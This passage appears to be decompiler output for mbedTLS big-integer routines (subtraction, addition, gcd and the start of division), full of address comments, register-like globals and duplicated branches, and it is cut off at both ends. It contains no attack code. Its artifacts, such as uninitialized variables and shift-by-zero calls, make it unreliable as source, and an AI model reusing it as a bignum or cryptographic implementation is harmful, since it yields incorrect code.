                                        mbedtls_mpi_free(&v7);
                                        // branch -> 0x8057eeb
                                        // 0x8057eeb
                                        g3 = v3;
                                        g7 = v2;
                                        g5 = v1;
                                        return 0;
                                    }
                                    v27 = v26;
                                    v13 = (int32_t *)v11;
                                    v29 = *v13;
                                    g3 = v29 < v27;
                                    v21 = v29 - v27;
                                    g4 = v21;
                                    *v13 = v21;
                                    v10 = v11 + 4;
                                    v25 = g3;
                                    while (v25 != 0) {
                                        // 0x8057f88
                                        v27 = v25;
                                        v13 = (int32_t *)v10;
                                        v29 = *v13;
                                        g3 = v29 < v27;
                                        v21 = v29 - v27;
                                        g4 = v21;
                                        *v13 = v21;
                                        v10 += 4;
                                        v25 = g3;
                                        // continue -> 0x8057f88
                                    }
                                    // 0x8057f9e
                                    g1 = 0;
                                    // branch -> 0x8057eda
                                    // 0x8057eda
                                    g6 = &v7;
                                    mbedtls_mpi_free(&v7);
                                    // branch -> 0x8057eeb
                                    // 0x8057eeb
                                    g3 = v3;
                                    g7 = v2;
                                    g5 = v1;
                                    return 0;
                                }
                            }
                        }
                    } else {
                        // 0x8057f30
                        v37 = *(int32_t *)(g3 + 8);
                        v16 = v37;
                        g4 = 0;
                        v39 = 0;
                        v19 = (int32_t *)v37;
                        v18 = *v19;
                        v20 = v18 - v39;
                        *v19 = v20;
                        v34 = g4;
                        v38 = v20;
                        v12 = (int32_t *)(4 * v34 + v17);
                        v40 = *v12;
                        v23 = v38 - *v12;
                        g3 = v23;
                        v32 = (int32_t)(v38 < v40) + (int32_t)(v18 < v39);
                        g4 = v34 + 1;
                        *(int32_t *)v16 = v23;
                        v9 = v16 + 4;
                        v16 = v9;
                        // branch -> 0x8057f4a
                        while (v24 > g4) {
                            // 0x8057f4a
                            v39 = v32;
                            v19 = (int32_t *)v9;
                            v18 = *v19;
                            v20 = v18 - v39;
                            *v19 = v20;
                            v34 = g4;
                            v38 = v20;
                            v12 = (int32_t *)(4 * v34 + v17);
                            v40 = *v12;
                            v23 = v38 - *v12;
                            g3 = v23;
                            v32 = (int32_t)(v38 < v40) + (int32_t)(v18 < v39);
                            g4 = v34 + 1;
                            *(int32_t *)v16 = v23;
                            v9 = v16 + 4;
                            v16 = v9;
                            // continue -> 0x8057f4a
                        }
                        // 0x8057f7a
                        if (v32 != 0) {
                            // 0x8057f8a
                            v14 = (int32_t *)v9;
                            v30 = *v14;
                            g3 = v30 < v32;
                            v22 = v30 - v32;
                            g4 = v22;
                            *v14 = v22;
                            v11 = v16 + 4;
                            v26 = g3;
                            if (v26 == 0) {
                                // 0x8057f9e
                                g1 = 0;
                                // branch -> 0x8057eda
                                // 0x8057eda
                                g6 = &v7;
                                mbedtls_mpi_free(&v7);
                                // branch -> 0x8057eeb
                                // 0x8057eeb
                                g3 = v3;
                                g7 = v2;
                                g5 = v1;
                                return 0;
                            }
                            v27 = v26;
                            v13 = (int32_t *)v11;
                            v29 = *v13;
                            g3 = v29 < v27;
                            v21 = v29 - v27;
                            g4 = v21;
                            *v13 = v21;
                            v10 = v11 + 4;
                            v25 = g3;
                            while (v25 != 0) {
                                // 0x8057f88
                                v27 = v25;
                                v13 = (int32_t *)v10;
                                v29 = *v13;
                                g3 = v29 < v27;
                                v21 = v29 - v27;
                                g4 = v21;
                                *v13 = v21;
                                v10 += 4;
                                v25 = g3;
                                // continue -> 0x8057f88
                            }
                            // 0x8057f9e
                            g1 = 0;
                            // branch -> 0x8057eda
                            // 0x8057eda
                            g6 = &v7;
                            mbedtls_mpi_free(&v7);
                            // branch -> 0x8057eeb
                            // 0x8057eeb
                            g3 = v3;
                            g7 = v2;
                            g5 = v1;
                            return 0;
                        }
                    }
                    // 0x8057f29
                    g1 = 0;
                    // branch -> 0x8057eda
                    // 0x8057eda
                    g6 = &v7;
                    mbedtls_mpi_free(&v7);
                    // branch -> 0x8057eeb
                    // 0x8057eeb
                    g3 = v3;
                    g7 = v2;
                    g5 = v1;
                    return 0;
                }
                // 0x8057f29
                g1 = 0;
                result = 0;
                // branch -> 0x8057eda
            } else {
                result = v15;
            }
        }
        // 0x8057eda
        g6 = &v7;
        mbedtls_mpi_free(&v7);
        // branch -> 0x8057eeb
        // 0x8057eeb
        g3 = v3;
        g7 = v2;
        g5 = v1;
        return result;
    }
    int32_t v41 = &v7; // 0x8057fa8_0
    g1 = v41;
    int32_t result2 = mbedtls_mpi_copy((char *)&v7, (int32_t *)v5); // 0x8057fb2
    g1 = result2;
    if (result2 != 0) {
        // 0x8057eda
        g6 = &v7;
        mbedtls_mpi_free(&v7);
        // branch -> 0x8057eeb
        // 0x8057eeb
        g3 = v3;
        g7 = v2;
        g5 = v1;
        return result2;
    }
    // 0x8057fbf
    g5 = v41;
    v8 = g3;
    // branch -> 0x8057ec6
    // 0x8057ec6
    v28 = g7;
    if (v8 == v28) {
        // 0x8057ef8
        *(int32_t *)v8 = 1;
        v24 = *(int32_t *)(v41 + 4);
        if (v24 != 0) {
            // 0x8057f05
            v35 = *(int32_t *)(g5 + 8);
            v17 = v35;
            v33 = v24 - 1;
            v36 = *(int32_t *)(v35 + 4 * v33);
            g4 = v36;
            if (v36 == 0) {
                // 0x8057f23
                if (v33 != 0) {
                    // 0x8057f18
                    v31 = v33;
                    // branch -> 0x8057f18
                    while (true) {
                        // 0x8057f18
                        if (*(int32_t *)(v35 - 4 + 4 * v31) == 0) {
                          lab_0x8057f20_3:;
                            int32_t v42 = v31 - 1; // 0x8057f20
                            if (v42 == 0) {
                                // break -> 0x8057f23
                                break;
                            }
                            v31 = v42;
                            // continue -> 0x8057f18
                            continue;
                        } else {
                            // 0x8057f30
                            // branch -> 0x8057f30
                            // 0x8057f30
                            v37 = *(int32_t *)(g3 + 8);
                            v16 = v37;
                            g4 = 0;
                            v39 = 0;
                            v19 = (int32_t *)v37;
                            v18 = *v19;
                            v20 = v18 - v39;
                            *v19 = v20;
                            v34 = g4;
                            v38 = v20;
                            v12 = (int32_t *)(4 * v34 + v17);
                            v40 = *v12;
                            v23 = v38 - *v12;
                            g3 = v23;
                            v32 = (int32_t)(v38 < v40) + (int32_t)(v18 < v39);
                            g4 = v34 + 1;
                            *(int32_t *)v16 = v23;
                            v9 = v16 + 4;
                            v16 = v9;
                            // branch -> 0x8057f4a
                            while (v31 > g4) {
                                // 0x8057f4a
                                v39 = v32;
                                v19 = (int32_t *)v9;
                                v18 = *v19;
                                v20 = v18 - v39;
                                *v19 = v20;
                                v34 = g4;
                                v38 = v20;
                                v12 = (int32_t *)(4 * v34 + v17);
                                v40 = *v12;
                                v23 = v38 - *v12;
                                g3 = v23;
                                v32 = (int32_t)(v38 < v40) + (int32_t)(v18 < v39);
                                g4 = v34 + 1;
                                *(int32_t *)v16 = v23;
                                v9 = v16 + 4;
                                v16 = v9;
                                // continue -> 0x8057f4a
                            }
                            // 0x8057f7a
                            if (v32 != 0) {
                                // 0x8057f8a
                                v14 = (int32_t *)v9;
                                v30 = *v14;
                                g3 = v30 < v32;
                                v22 = v30 - v32;
                                g4 = v22;
                                *v14 = v22;
                                v11 = v16 + 4;
                                v26 = g3;
                                if (v26 == 0) {
                                    // 0x8057f9e
                                    g1 = 0;
                                    // branch -> 0x8057eda
                                    // 0x8057eda
                                    g6 = &v7;
                                    mbedtls_mpi_free(&v7);
                                    // branch -> 0x8057eeb
                                    // 0x8057eeb
                                    g3 = v3;
                                    g7 = v2;
                                    g5 = v1;
                                    return 0;
                                }
                                v27 = v26;
                                v13 = (int32_t *)v11;
                                v29 = *v13;
                                g3 = v29 < v27;
                                v21 = v29 - v27;
                                g4 = v21;
                                *v13 = v21;
                                v10 = v11 + 4;
                                v25 = g3;
                                while (v25 != 0) {
                                    // 0x8057f88
                                    v27 = v25;
                                    v13 = (int32_t *)v10;
                                    v29 = *v13;
                                    g3 = v29 < v27;
                                    v21 = v29 - v27;
                                    g4 = v21;
                                    *v13 = v21;
                                    v10 += 4;
                                    v25 = g3;
                                    // continue -> 0x8057f88
                                }
                                // 0x8057f9e
                                g1 = 0;
                                // branch -> 0x8057eda
                                // 0x8057eda
                                g6 = &v7;
                                mbedtls_mpi_free(&v7);
                                // branch -> 0x8057eeb
                                // 0x8057eeb
                                g3 = v3;
                                g7 = v2;
                                g5 = v1;
                                return 0;
                            }
                        }
                        // 0x8057f29
                        g1 = 0;
                        // branch -> 0x8057eda
                        // 0x8057eda
                        g6 = &v7;
                        mbedtls_mpi_free(&v7);
                        // branch -> 0x8057eeb
                        // 0x8057eeb
                        g3 = v3;
                        g7 = v2;
                        g5 = v1;
                        return 0;
                    }
                }
            } else {
                // 0x8057f30
                v37 = *(int32_t *)(g3 + 8);
                v16 = v37;
                g4 = 0;
                v39 = 0;
                v19 = (int32_t *)v37;
                v18 = *v19;
                v20 = v18 - v39;
                *v19 = v20;
                v34 = g4;
                v38 = v20;
                v12 = (int32_t *)(4 * v34 + v17);
                v40 = *v12;
                v23 = v38 - *v12;
                g3 = v23;
                v32 = (int32_t)(v38 < v40) + (int32_t)(v18 < v39);
                g4 = v34 + 1;
                *(int32_t *)v16 = v23;
                v9 = v16 + 4;
                v16 = v9;
                // branch -> 0x8057f4a
                while (v24 > g4) {
                    // 0x8057f4a
                    v39 = v32;
                    v19 = (int32_t *)v9;
                    v18 = *v19;
                    v20 = v18 - v39;
                    *v19 = v20;
                    v34 = g4;
                    v38 = v20;
                    v12 = (int32_t *)(4 * v34 + v17);
                    v40 = *v12;
                    v23 = v38 - *v12;
                    g3 = v23;
                    v32 = (int32_t)(v38 < v40) + (int32_t)(v18 < v39);
                    g4 = v34 + 1;
                    *(int32_t *)v16 = v23;
                    v9 = v16 + 4;
                    v16 = v9;
                    // continue -> 0x8057f4a
                }
                // 0x8057f7a
                if (v32 != 0) {
                    // 0x8057f8a
                    v14 = (int32_t *)v9;
                    v30 = *v14;
                    g3 = v30 < v32;
                    v22 = v30 - v32;
                    g4 = v22;
                    *v14 = v22;
                    v11 = v16 + 4;
                    v26 = g3;
                    if (v26 == 0) {
                        // 0x8057f9e
                        g1 = 0;
                        // branch -> 0x8057eda
                        // 0x8057eda
                        g6 = &v7;
                        mbedtls_mpi_free(&v7);
                        // branch -> 0x8057eeb
                        // 0x8057eeb
                        g3 = v3;
                        g7 = v2;
                        g5 = v1;
                        return 0;
                    }
                    v27 = v26;
                    v13 = (int32_t *)v11;
                    v29 = *v13;
                    g3 = v29 < v27;
                    v21 = v29 - v27;
                    g4 = v21;
                    *v13 = v21;
                    v10 = v11 + 4;
                    v25 = g3;
                    while (v25 != 0) {
                        // 0x8057f88
                        v27 = v25;
                        v13 = (int32_t *)v10;
                        v29 = *v13;
                        g3 = v29 < v27;
                        v21 = v29 - v27;
                        g4 = v21;
                        *v13 = v21;
                        v10 += 4;
                        v25 = g3;
                        // continue -> 0x8057f88
                    }
                    // 0x8057f9e
                    g1 = 0;
                    // branch -> 0x8057eda
                    // 0x8057eda
                    g6 = &v7;
                    mbedtls_mpi_free(&v7);
                    // branch -> 0x8057eeb
                    // 0x8057eeb
                    g3 = v3;
                    g7 = v2;
                    g5 = v1;
                    return 0;
                }
            }
            // 0x8057f29
            g1 = 0;
            // branch -> 0x8057eda
            // 0x8057eda
            g6 = &v7;
            mbedtls_mpi_free(&v7);
            // branch -> 0x8057eeb
            // 0x8057eeb
            g3 = v3;
            g7 = v2;
            g5 = v1;
            return 0;
        }
        // 0x8057f29
        g1 = 0;
        result = 0;
        // branch -> 0x8057eda
    } else {
        // 0x8057eca
        v15 = mbedtls_mpi_copy((char *)v8, (int32_t *)v28);
        g1 = v15;
        if (v15 == 0) {
            // 0x8057eca
            // branch -> 0x8057ef8
            // 0x8057ef8
            *(int32_t *)g3 = 1;
            v24 = *(int32_t *)(g5 + 4);
            if (v24 != 0) {
                // 0x8057f05
                v35 = *(int32_t *)(g5 + 8);
                v17 = v35;
                v33 = v24 - 1;
                v36 = *(int32_t *)(v35 + 4 * v33);
                g4 = v36;
                if (v36 == 0) {
                    // 0x8057f23
                    if (v33 != 0) {
                        // 0x8057f18
                        v31 = v33;
                        // branch -> 0x8057f18
                        while (true) {
                            // 0x8057f18
                            if (*(int32_t *)(v35 - 4 + 4 * v31) == 0) {
                                goto lab_0x8057f20_3;
                            }
                            // 0x8057f30
                            // branch -> 0x8057f30
                            // 0x8057f30
                            v37 = *(int32_t *)(g3 + 8);
                            v16 = v37;
                            g4 = 0;
                            v39 = 0;
                            v19 = (int32_t *)v37;
                            v18 = *v19;
                            v20 = v18 - v39;
                            *v19 = v20;
                            v34 = g4;
                            v38 = v20;
                            v12 = (int32_t *)(4 * v34 + v17);
                            v40 = *v12;
                            v23 = v38 - *v12;
                            g3 = v23;
                            v32 = (int32_t)(v38 < v40) + (int32_t)(v18 < v39);
                            g4 = v34 + 1;
                            *(int32_t *)v16 = v23;
                            v9 = v16 + 4;
                            v16 = v9;
                            // branch -> 0x8057f4a
                            while (v31 > g4) {
                                // 0x8057f4a
                                v39 = v32;
                                v19 = (int32_t *)v9;
                                v18 = *v19;
                                v20 = v18 - v39;
                                *v19 = v20;
                                v34 = g4;
                                v38 = v20;
                                v12 = (int32_t *)(4 * v34 + v17);
                                v40 = *v12;
                                v23 = v38 - *v12;
                                g3 = v23;
                                v32 = (int32_t)(v38 < v40) + (int32_t)(v18 < v39);
                                g4 = v34 + 1;
                                *(int32_t *)v16 = v23;
                                v9 = v16 + 4;
                                v16 = v9;
                                // continue -> 0x8057f4a
                            }
                            // 0x8057f7a
                            if (v32 != 0) {
                                // 0x8057f8a
                                v14 = (int32_t *)v9;
                                v30 = *v14;
                                g3 = v30 < v32;
                                v22 = v30 - v32;
                                g4 = v22;
                                *v14 = v22;
                                v11 = v16 + 4;
                                v26 = g3;
                                if (v26 == 0) {
                                    // 0x8057f9e
                                    g1 = 0;
                                    // branch -> 0x8057eda
                                    // 0x8057eda
                                    g6 = &v7;
                                    mbedtls_mpi_free(&v7);
                                    // branch -> 0x8057eeb
                                    // 0x8057eeb
                                    g3 = v3;
                                    g7 = v2;
                                    g5 = v1;
                                    return 0;
                                }
                                v27 = v26;
                                v13 = (int32_t *)v11;
                                v29 = *v13;
                                g3 = v29 < v27;
                                v21 = v29 - v27;
                                g4 = v21;
                                *v13 = v21;
                                v10 = v11 + 4;
                                v25 = g3;
                                while (v25 != 0) {
                                    // 0x8057f88
                                    v27 = v25;
                                    v13 = (int32_t *)v10;
                                    v29 = *v13;
                                    g3 = v29 < v27;
                                    v21 = v29 - v27;
                                    g4 = v21;
                                    *v13 = v21;
                                    v10 += 4;
                                    v25 = g3;
                                    // continue -> 0x8057f88
                                }
                                // 0x8057f9e
                                g1 = 0;
                                // branch -> 0x8057eda
                                // 0x8057eda
                                g6 = &v7;
                                mbedtls_mpi_free(&v7);
                                // branch -> 0x8057eeb
                                // 0x8057eeb
                                g3 = v3;
                                g7 = v2;
                                g5 = v1;
                                return 0;
                            }
                        }
                    }
                } else {
                    // 0x8057f30
                    v37 = *(int32_t *)(g3 + 8);
                    v16 = v37;
                    g4 = 0;
                    v39 = 0;
                    v19 = (int32_t *)v37;
                    v18 = *v19;
                    v20 = v18 - v39;
                    *v19 = v20;
                    v34 = g4;
                    v38 = v20;
                    v12 = (int32_t *)(4 * v34 + v17);
                    v40 = *v12;
                    v23 = v38 - *v12;
                    g3 = v23;
                    v32 = (int32_t)(v38 < v40) + (int32_t)(v18 < v39);
                    g4 = v34 + 1;
                    *(int32_t *)v16 = v23;
                    v9 = v16 + 4;
                    v16 = v9;
                    // branch -> 0x8057f4a
                    while (v24 > g4) {
                        // 0x8057f4a
                        v39 = v32;
                        v19 = (int32_t *)v9;
                        v18 = *v19;
                        v20 = v18 - v39;
                        *v19 = v20;
                        v34 = g4;
                        v38 = v20;
                        v12 = (int32_t *)(4 * v34 + v17);
                        v40 = *v12;
                        v23 = v38 - *v12;
                        g3 = v23;
                        v32 = (int32_t)(v38 < v40) + (int32_t)(v18 < v39);
                        g4 = v34 + 1;
                        *(int32_t *)v16 = v23;
                        v9 = v16 + 4;
                        v16 = v9;
                        // continue -> 0x8057f4a
                    }
                    // 0x8057f7a
                    if (v32 != 0) {
                        // 0x8057f8a
                        v14 = (int32_t *)v9;
                        v30 = *v14;
                        g3 = v30 < v32;
                        v22 = v30 - v32;
                        g4 = v22;
                        *v14 = v22;
                        v11 = v16 + 4;
                        v26 = g3;
                        if (v26 == 0) {
                            // 0x8057f9e
                            g1 = 0;
                            // branch -> 0x8057eda
                            // 0x8057eda
                            g6 = &v7;
                            mbedtls_mpi_free(&v7);
                            // branch -> 0x8057eeb
                            // 0x8057eeb
                            g3 = v3;
                            g7 = v2;
                            g5 = v1;
                            return 0;
                        }
                        v27 = v26;
                        v13 = (int32_t *)v11;
                        v29 = *v13;
                        g3 = v29 < v27;
                        v21 = v29 - v27;
                        g4 = v21;
                        *v13 = v21;
                        v10 = v11 + 4;
                        v25 = g3;
                        while (v25 != 0) {
                            // 0x8057f88
                            v27 = v25;
                            v13 = (int32_t *)v10;
                            v29 = *v13;
                            g3 = v29 < v27;
                            v21 = v29 - v27;
                            g4 = v21;
                            *v13 = v21;
                            v10 += 4;
                            v25 = g3;
                            // continue -> 0x8057f88
                        }
                        // 0x8057f9e
                        g1 = 0;
                        // branch -> 0x8057eda
                        // 0x8057eda
                        g6 = &v7;
                        mbedtls_mpi_free(&v7);
                        // branch -> 0x8057eeb
                        // 0x8057eeb
                        g3 = v3;
                        g7 = v2;
                        g5 = v1;
                        return 0;
                    }
                }
                // 0x8057f29
                g1 = 0;
                // branch -> 0x8057eda
                // 0x8057eda
                g6 = &v7;
                mbedtls_mpi_free(&v7);
                // branch -> 0x8057eeb
                // 0x8057eeb
                g3 = v3;
                g7 = v2;
                g5 = v1;
                return 0;
            }
            // 0x8057f29
            g1 = 0;
            result = 0;
            // branch -> 0x8057eda
        } else {
            result = v15;
        }
    }
    // 0x8057eda
    g6 = &v7;
    mbedtls_mpi_free(&v7);
    // branch -> 0x8057eeb
    // 0x8057eeb
    g3 = v3;
    g7 = v2;
    g5 = v1;
    return result;
}

// Address range: 0x8057fd0 - 0x805807f
int32_t mbedtls_mpi_sub_mpi(int32_t * a1, int32_t * a2, int32_t * a3) {
    int32_t v1 = (int32_t)a1;
    int32_t v2 = (int32_t)a2;
    int32_t v3 = (int32_t)a3;
    int32_t v4 = g3; // 0x8057fd6
    g3 = v2;
    int32_t v5 = g7; // 0x8057fdc
    g7 = v3;
    int32_t v6 = g5; // 0x8057fe2
    int32_t v7 = *a2; // 0x8057fe5
    g5 = v7;
    int32_t v8;
    if (*a3 * v7 < 1) {
        int32_t result = mbedtls_mpi_add_abs(a1, v2, v3); // 0x8058036
        if (result == 0) {
            // 0x805803f
            v8 = v1;
            g6 = v8;
            *(int32_t *)v8 = g5;
            g3 = v4;
            g7 = v5;
            g5 = v6;
            return result;
        }
        // 0x8058017
        g3 = v4;
        g7 = v5;
        g5 = v6;
        return result;
    }
    // 0x8057ff0
    int32_t result3; // 0x8058023_2
    if (mbedtls_mpi_cmp_abs(v2, v3) < 0) {
        int32_t v9 = mbedtls_mpi_sub_abs((int32_t *)v1, g7, g3); // 0x8058066
        if (v9 == 0) {
            // 0x805806f
            g6 = v1;
            *(int32_t *)v1 = -g5;
            result3 = v9;
            // branch -> 0x8058017
        } else {
            result3 = v9;
        }
    } else {
        int32_t result2 = mbedtls_mpi_sub_abs((int32_t *)v1, g3, g7); // 0x805800e
        if (result2 == 0) {
            // 0x805803f
            v8 = v1;
            g6 = v8;
            *(int32_t *)v8 = g5;
            g3 = v4;
            g7 = v5;
            g5 = v6;
            return result2;
        }
        result3 = result2;
    }
    // 0x8058017
    g3 = v4;
    g7 = v5;
    g5 = v6;
    return result3;
}

// Address range: 0x8058080 - 0x80580cf
int32_t mbedtls_mpi_sub_int(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = a3 >> 31; // 0x8058092
    int32_t v2 = v1 | 1; // bp-28
    g6 = v1;
    int32_t result = mbedtls_mpi_sub_mpi((int32_t *)a1, (int32_t *)a2, &v2); // 0x80580c2
    g1 = result;
    int32_t v3;
    g2 = v3;
    return result;
}

// Address range: 0x80580d0 - 0x805816f
int32_t mbedtls_mpi_add_mpi(int32_t * a1, int32_t * a2, int32_t * a3) {
    int32_t v1 = (int32_t)a1;
    int32_t v2 = (int32_t)a2;
    int32_t v3 = (int32_t)a3;
    int32_t v4 = g3; // 0x80580d6
    g3 = v2;
    int32_t v5 = g7; // 0x80580dc
    g7 = v3;
    int32_t v6 = g5; // 0x80580e2
    int32_t v7 = *a2; // 0x80580e5
    g5 = v7;
    int32_t v8;
    int32_t v9;
    if (*a3 * v7 >= 0) {
        int32_t result = mbedtls_mpi_add_abs(a1, v2, v3); // 0x80580fe
        if (result == 0) {
            // 0x8058107
            v9 = v1;
            g6 = v9;
            *(int32_t *)v9 = g5;
            // branch -> 0x805810c
        }
        // 0x805810c
        g3 = v4;
        g7 = v5;
        g5 = v6;
        g2 = v8;
        return result;
    }
    // 0x8058120
    int32_t result2; // eax
    if (mbedtls_mpi_cmp_abs(v2, v3) < 0) {
        int32_t v10 = mbedtls_mpi_sub_abs((int32_t *)v1, g7, g3); // 0x805815e
        result2 = v10;
        if (v10 == 0) {
            // 0x8058167
            g6 = v1;
            *(int32_t *)v1 = -g5;
            // branch -> 0x805810c
        }
    } else {
        int32_t v11 = mbedtls_mpi_sub_abs((int32_t *)v1, g3, g7); // 0x805813e
        result2 = v11;
        if (v11 == 0) {
            // 0x8058107
            v9 = v1;
            g6 = v9;
            *(int32_t *)v9 = g5;
            // branch -> 0x805810c
        }
    }
    // 0x805810c
    g3 = v4;
    g7 = v5;
    g5 = v6;
    g2 = v8;
    return result2;
}

// Address range: 0x8058170 - 0x80581bf
int32_t mbedtls_mpi_add_int(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = a3 >> 31; // 0x8058182
    int32_t v2 = v1 | 1; // bp-28
    g6 = v1;
    int32_t result = mbedtls_mpi_add_mpi((int32_t *)a1, (int32_t *)a2, &v2); // 0x80581b2
    g1 = result;
    int32_t v3;
    g2 = v3;
    return result;
}

// Address range: 0x80581c0 - 0x80584ef
int32_t mbedtls_mpi_gcd(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = g7; // 0x80581c4
    int32_t v2 = g3; // 0x80581c5
    g1 = a2;
    int32_t v3; // bp-52
    g3 = &v3;
    int32_t v4 = 1; // bp-40
    int32_t v5; // bp-64
    g7 = &v5;
    v3 = 1;
    v5 = 1;
    int32_t v6 = mbedtls_mpi_copy((char *)&v3, (int32_t *)a2); // 0x8058218
    g1 = v6;
    int32_t result = v6; // 0x8058224
    int32_t v7;
    if (v6 == 0) {
        // 0x8058250
        g1 = a3;
        int32_t v8 = mbedtls_mpi_copy((char *)g7, (int32_t *)a3); // 0x805825a
        g1 = v8;
        if (v8 == 0) {
            int32_t v9 = mbedtls_mpi_shift_r(g3, 0); // 0x80582f6
            g1 = v9;
            if (v9 == 0) {
                int32_t v10 = mbedtls_mpi_shift_r(g7, 0); // 0x805830d
                g1 = v10;
                if (v10 == 0) {
                    // 0x805831a
                    v5 = 1;
                    v3 = 1;
                    int32_t v11; // 0x80584cf
                    int32_t v12; // 0x80584e6
                    int32_t v13; // 0x80584dc
                    if (mbedtls_mpi_cmp_int(g3, 0) == 0) {
                        // 0x80584c5
                        v11 = mbedtls_mpi_shift_l(g7, 0);
                        g1 = v11;
                        if (v11 == 0) {
                            // 0x80584dc
                            v13 = a1;
                            g1 = v13;
                            v12 = mbedtls_mpi_copy((char *)v13, (int32_t *)g7);
                            g1 = v12;
                            result = v12;
                            // branch -> 0x8058221
                        } else {
                            result = v11;
                        }
                    } else {
                        while (true) {
                            int32_t v14 = mbedtls_mpi_shift_r(g3, 0); // 0x8058383
                            g1 = v14;
                            if (v14 == 0) {
                                int32_t v15 = mbedtls_mpi_shift_r(g7, 0); // 0x80583cf
                                g1 = v15;
                                if (v15 == 0) {
                                    // 0x80583dc
                                    if (mbedtls_mpi_cmp_mpi((int32_t *)g3, (int32_t *)g7) < 0) {
                                        int32_t v16 = g7; // 0x8058494
                                        int32_t v17 = mbedtls_mpi_sub_abs((int32_t *)v16, v16, g3); // 0x805849b
                                        g1 = v17;
                                        if (v17 == 0) {
                                            int32_t v18 = mbedtls_mpi_shift_r(g7, 1); // 0x80584b3
                                            g1 = v18;
                                            if (v18 == 0) {
                                              lab_0x8058328:
                                                // 0x8058328
                                                if (mbedtls_mpi_cmp_int(g3, 0) == 0) {
                                                    // break -> 0x80584c5
                                                    break;
                                                }
                                                // continue -> 0x8058340
                                                continue;
                                            } else {
                                                result = v18;
                                            }
                                        } else {
                                            result = v17;
                                        }
                                    } else {
                                        int32_t v19 = g3; // 0x80583f4
                                        int32_t v20 = mbedtls_mpi_sub_abs((int32_t *)v19, v19, g7); // 0x80583fb
                                        g1 = v20;
                                        if (v20 == 0) {
                                            int32_t v21 = mbedtls_mpi_shift_r(g3, 1); // 0x8058413
                                            g1 = v21;
                                            if (v21 == 0) {
                                                goto lab_0x8058328;
                                            }
                                            result = v21;
                                            // 0x8058221
                                            g6 = &v4;
                                            g1 = mbedtls_mpi_free(&v4);
                                            g1 = mbedtls_mpi_free((int32_t *)g3);
                                            mbedtls_mpi_free((int32_t *)g7);
                                            g1 = result;
                                            g3 = v2;
                                            g7 = v1;
                                            g2 = v7;
                                            return result;
                                        }
                                        result = v20;
                                    }
                                    // 0x8058221
                                    g6 = &v4;
                                    g1 = mbedtls_mpi_free(&v4);
                                    g1 = mbedtls_mpi_free((int32_t *)g3);
                                    mbedtls_mpi_free((int32_t *)g7);
                                    g1 = result;
                                    g3 = v2;
                                    g7 = v1;
                                    g2 = v7;
                                    return result;
                                }
                            }
                        }
                        // 0x80584c5
                        v11 = mbedtls_mpi_shift_l(g7, 0);
                        g1 = v11;
                        if (v11 == 0) {
                            // 0x80584dc
                            v13 = a1;
                            g1 = v13;
                            v12 = mbedtls_mpi_copy((char *)v13, (int32_t *)g7);
                            g1 = v12;
                            result = v12;
                            // branch -> 0x8058221
                        } else {
                            result = v11;
                        }
                    }
                    // 0x8058221
                    g6 = &v4;
                    g1 = mbedtls_mpi_free(&v4);
                    g1 = mbedtls_mpi_free((int32_t *)g3);
                    mbedtls_mpi_free((int32_t *)g7);
                    g1 = result;
                    g3 = v2;
                    g7 = v1;
                    g2 = v7;
                    return result;
                }
                result = v10;
            } else {
                result = v9;
            }
        } else {
            result = v8;
        }
    }
    // 0x8058221
    g6 = &v4;
    g1 = mbedtls_mpi_free(&v4);
    g1 = mbedtls_mpi_free((int32_t *)g3);
    mbedtls_mpi_free((int32_t *)g7);
    g1 = result;
    g3 = v2;
    g7 = v1;
    g2 = v7;
    return result;
}

// Address range: 0x80584f0 - 0x8058b9f
int32_t mbedtls_mpi_div_mpi(int32_t * a1, int32_t * a2, int32_t * a3, int32_t * a4) {
    int32_t v1 = (int32_t)a1;
    int32_t v2 = (int32_t)a4;
    int32_t v3 = g3; // 0x80584f9
    g3 = v2;
    int32_t v4 = g5; // 0x80584ff
    g5 = (int32_t)a3;
    int32_t v5 = g7; // 0x8058505
    int32_t v6 = mbedtls_mpi_cmp_int(v2, 0); // 0x8058513
    g6 = -12;
    if (v6 == 0) {
        // 0x8058521
        g3 = v3;
        g7 = v5;
        g5 = v4;
        return -12;
    }
    int32_t v7 = 1;
    int32_t v8 = 1;
    int32_t v9 = 1;
    int32_t v10 = 1;
    int32_t v11 = 1;
    int32_t v12 = mbedtls_mpi_cmp_abs(g5, g3); // 0x80585a0
    g1 = v12;
    int32_t v13; // 0x80585d1_0
    int32_t v14; // bp+068
    int32_t v15; // bp+066
    int32_t v16; // bp+067
    int32_t result; // 0x8058675
    int32_t v17; // 0x8058697
    if (v12 < 0) {
        // 0x8058660
        g7 = v1;
        if (v1 != 0) {
            // 0x8058667
            result = mbedtls_mpi_lset((char *)v1, 0);
            g1 = result;
            if (result != 0) {
                // 0x80586a6
                g7 = &v7;
                // branch -> 0x80585c2
                // 0x80585c2
                v13 = &v11;
                g1 = v13;
                v14 = &v9;
                v16 = v13;
                v15 = &v10;
                // branch -> 0x80585da
                // 0x80585da
                g1 = mbedtls_mpi_free((int32_t *)g7);
                mbedtls_mpi_free((int32_t *)(int32_t)&v8);
                g1 = v14;
                g1 = mbedtls_mpi_free((int32_t *)v14);
                g4 = v15;
                mbedtls_mpi_free((int32_t *)v15);
                g1 = v16;
                mbedtls_mpi_free((int32_t *)v16);
                g6 = result;
                g3 = v3;
                g7 = v5;
                g5 = v4;
                return result;
            }
        }
        // 0x8058680
        g3 = (int32_t)a2;
        g6 = 0;
        if (a2 == NULL) {
            // 0x8058521
            g3 = v3;
            g7 = v5;
            g5 = v4;
            return 0;
        }
        // 0x805868d
        v17 = mbedtls_mpi_copy((char *)a2, (int32_t *)g5);
        g6 = v17;
        if (v17 == 0) {
            // 0x8058521
            g3 = v3;
            g7 = v5;
            g5 = v4;
            return 0;
        }
        // 0x80586a6
        g7 = &v7;
        // branch -> 0x80585c2
    } else {
        // 0x80585ad
        g7 = &v7;
        int32_t v18 = mbedtls_mpi_copy((char *)&v7, (int32_t *)g5); // 0x80585b7
        g1 = v18;
        if (v18 == 0) {
            int32_t v19 = &v8; // 0x8058630_0
            int32_t v20 = mbedtls_mpi_copy((char *)&v8, (int32_t *)g3); // 0x805863d
            if (v20 == 0) {
                // 0x80586b0
                v8 = 1;
                v7 = 1;
                int32_t v21 = &v9; // 0x80586c8_0
                mbedtls_mpi_grow(v21, (char *)(*(int32_t *)(g5 + 4) + 2));
                int32_t v22 = &v11; // 0x80586e0_0
                g1 = v22;
                v14 = v21;
                result = v21;
                v16 = v22;
                v15 = &v10;
                // branch -> 0x80585da
            } else {
